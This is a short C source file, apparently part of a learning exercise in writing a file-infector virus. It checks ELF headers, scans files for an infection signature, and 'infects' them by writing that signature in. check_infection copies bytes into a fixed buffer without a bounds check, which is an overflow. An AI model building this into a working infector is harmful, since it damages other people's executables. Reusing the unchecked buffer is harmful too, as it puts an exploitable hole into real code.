#include "famine.h"

bool    check_elf(FILE *fp, int arch)
{
    unsigned char header[5];
    int ch;
    for (int i = 0; i < 5; i++)
    {
        ch = fgetc(fp);
        if (ch == EOF)
        {
            fclose(fp);
            return false;
        }
        header[i] = (unsigned char)ch;
    }
    // Check ELF magic: 0x7F 'E' 'L' 'F'
    if (header[0] != 0x7F || header[1] != 'E' || header[2] != 'L' || header[3] != 'F')
        return false;
    // 5th byte: class (1 = 32-bit, 2 = 64-bit)
    return header[4] == arch;
}

bool    check_infection(FILE *fp, const char *string, size_t len)
{
    int ch;
    char buffer[2024];
    size_t buf_index = 0;

    while ((ch = fgetc(fp)) != EOF)
    {
        if (isprint(ch))
            buffer[buf_index++] = ch;
        else 
        {
            if (buf_index >= len)
            {
                buffer[buf_index] = '\0';
                if(strstr(buffer, string))
                    return (true);
            }
            buf_index = 0;
        }
    }
    buffer[buf_index] = '\0';
    if(strstr(buffer, string))
        return (true);
    return (false);
}

void    infect(FILE *fp, const char *string, size_t len)
{
    fwrite(string, sizeof(char), len, fp);
    printf("INFECT.\n");
}